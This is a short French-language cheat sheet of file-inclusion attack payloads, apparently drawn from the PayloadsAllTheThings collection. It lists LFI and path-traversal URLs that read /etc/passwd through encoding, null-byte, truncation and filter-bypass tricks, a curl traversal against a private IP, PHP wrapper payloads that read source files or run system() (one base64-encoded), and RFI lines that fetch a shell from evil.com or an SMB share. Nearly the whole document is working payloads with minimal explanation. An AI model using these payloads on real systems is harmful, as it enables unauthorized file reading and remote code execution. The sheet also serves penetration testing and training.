
> [PayloadsAllTheThings](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)

**LFI** → exécution de code arbitraire via inclusion d'un fichier local.
**Path Traversal** → lecture d'un fichier arbitraire (pas d'exécution).

# LFI

```
http://example.com/index.php?page=../../../etc/passwd
```

### Null byte (PHP < 5.3.4)

```
http://example.com/index.php?page=../../../etc/passwd%00
```

### Double encoding

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
```

### UTF-8 encoding

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Path truncation (PHP, filename > 4096 bytes tronqué)

```
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE]
```

### Filter bypass

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../etc/passwd
```

### Path traversal URL-encodé (curl)

> `.%2e` = `..` encodé -  contourne les filtres qui bloquent `../` en clair.

```bash
curl --path-as-is "http://192.168.127.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

# PHP Wrappers

> Utilisables en LFI pour lire des fichiers sources ou exécuter du code sans écrire de fichier.

### Lire un fichier directement

```
php://filter/resource=admin.php
```

### Lire un fichier encodé en base64 (contourne les filtres sur l'extension)

```
php://filter/convert.base64-encode/resource=../../../../../var/www/html/backup.php
```

### Exécuter du code via data:// (nécessite `allow_url_include = On`)

```
data://text/plain,<?php echo system('uname -a ');?>
data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2xzIC1sICcpOz8+
```

# RFI

> Nécessite `allow_url_include = On` (désactivé par défaut depuis PHP 5).

```
http://example.com/index.php?page=http://evil.com/shell.txt
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### Bypass via SMB (Windows, `allow_url_include` off)

```
http://example.com/index.php?page=\\10.0.0.1\share\shell.php
```
